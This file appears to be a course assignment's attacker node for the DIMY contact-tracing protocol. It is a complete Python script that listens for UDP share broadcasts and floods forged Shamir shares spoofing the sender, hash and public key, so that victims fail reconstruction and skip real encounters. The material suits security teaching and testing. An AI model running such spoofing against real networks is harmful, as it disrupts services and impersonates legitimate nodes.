#!/usr/bin/env python3
"""
Attacker node for DIMY Task 11-B (inter-node UDP attack).

Implemented attack:
    Share Poisoning / Injection Attack

Workflow:
1) Listen to legitimate UDP SHARE broadcasts.
2) For each new (sender, eph_hash), forge multiple fake shares while spoofing
   the same sender/eph_hash/pubkey metadata.
3) Broadcast forged shares quickly so victims may collect >=k shares early and
   attempt reconstruction on attacker-controlled share values.
4) Victims fail hash verification and skip valid encounter registration.

Usage examples:
    python Attacker.py
    python Attacker.py --udp-port 50000 --inject-delay-ms 80
"""

from __future__ import annotations

import argparse
import base64
import json
import secrets
import socket
import struct
import threading
import time
from datetime import datetime
from typing import Dict, Set, Tuple


def log(message: str) -> None:
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{now}] [ATTACKER] {message}", flush=True)


def encode_fake_share_values(byte_len: int = 32) -> str:
    # Match Dimy.py format: each y is uint16, so 32 values => 64 bytes.
    out = bytearray()
    for _ in range(byte_len):
        y = secrets.randbelow(257)  # same finite field range used by frontend
        out.extend(struct.pack(">H", y))
    return base64.b64encode(bytes(out)).decode("ascii")


class AttackerNode:
    def __init__(
        self,
        udp_port: int,
        inject_delay_ms: int,
        rebroadcast_host: str = "255.255.255.255",
    ) -> None:
        self.udp_port = udp_port
        self.inject_delay_ms = inject_delay_ms
        self.rebroadcast_host = rebroadcast_host

        self.stop_event = threading.Event()
        self.attacked_keys: Set[Tuple[str, str]] = set()
        self.lock = threading.Lock()

        self.recv_sock = self._create_recv_socket()
        self.send_sock = self._create_send_socket()

    def _create_recv_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        except (AttributeError, OSError):
            pass
        sock.bind(("", self.udp_port))
        sock.settimeout(1.0)
        return sock

    def _create_send_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return sock

    def _is_share_message(self, msg: Dict) -> bool:
        return isinstance(msg, dict) and msg.get("type") == "SHARE"

    def _inject_poison_shares(self, observed: Dict) -> None:
        sender = str(observed.get("sender", ""))
        eph_hash = str(observed.get("eph_hash", ""))
        observed_idx = int(observed.get("share_index", 0))
        k = int(observed.get("k", 0))
        n = int(observed.get("n", 0))
        pubkey = str(observed.get("pubkey", ""))

        if not sender or not eph_hash or not pubkey or k <= 0 or n <= 0:
            return

        key = (sender, eph_hash)
        with self.lock:
            if key in self.attacked_keys:
                return
            self.attacked_keys.add(key)

        # Choose up to k unique indices excluding the one already observed.
        candidate_indexes = [i for i in range(1, n + 1) if i != observed_idx]
        inject_indexes = candidate_indexes[:k]
        if not inject_indexes:
            return

        log(
            f"Launching poisoning for sender={sender}, eph={eph_hash[:10]}, "
            f"k={k}, n={n}, forged={len(inject_indexes)}"
        )

        for idx in inject_indexes:
            fake = {
                "type": "SHARE",
                "ver": 1,
                "sender": sender,          # spoof legitimate sender
                "eph_hash": eph_hash,      # spoof same EphID hash
                "share_index": idx,
                "k": k,
                "n": n,
                "pubkey": pubkey,          # reuse sender public key
                "share_data": encode_fake_share_values(byte_len=32),
                "ts": int(time.time()),
            }
            raw = json.dumps(fake, separators=(",", ":"), ensure_ascii=True).encode(
                "utf-8"
            )
            self.send_sock.sendto(raw, (self.rebroadcast_host, self.udp_port))
            time.sleep(self.inject_delay_ms / 1000.0)

        log(
            f"Poisoning sent for sender={sender}, eph={eph_hash[:10]} "
            f"indices={inject_indexes}"
        )

    def run(self) -> None:
        log(
            f"Attacker listening on UDP :{self.udp_port}, "
            f"mode=share_poisoning, delay={self.inject_delay_ms}ms"
        )
        try:
            while not self.stop_event.is_set():
                try:
                    data, _ = self.recv_sock.recvfrom(65536)
                except socket.timeout:
                    continue
                except OSError:
                    if self.stop_event.is_set():
                        break
                    continue

                try:
                    msg = json.loads(data.decode("utf-8"))
                except Exception:
                    continue

                if not self._is_share_message(msg):
                    continue
                # Run poisoning async to avoid blocking receive loop.
                threading.Thread(
                    target=self._inject_poison_shares, args=(msg,), daemon=True
                ).start()
        except KeyboardInterrupt:
            log("Interrupted, shutting down attacker...")
        finally:
            self.stop_event.set()
            try:
                self.recv_sock.close()
            except Exception:
                pass
            try:
                self.send_sock.close()
            except Exception:
                pass
            log("Attacker stopped.")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="DIMY attacker node")
    parser.add_argument(
        "--udp-port", type=int, default=50000, help="UDP broadcast port used by DIMY nodes"
    )
    parser.add_argument(
        "--inject-delay-ms",
        type=int,
        default=80,
        help="Delay between forged shares in milliseconds",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    node = AttackerNode(
        udp_port=args.udp_port,
        inject_delay_ms=args.inject_delay_ms,
    )
    node.run()


if __name__ == "__main__":
    main()
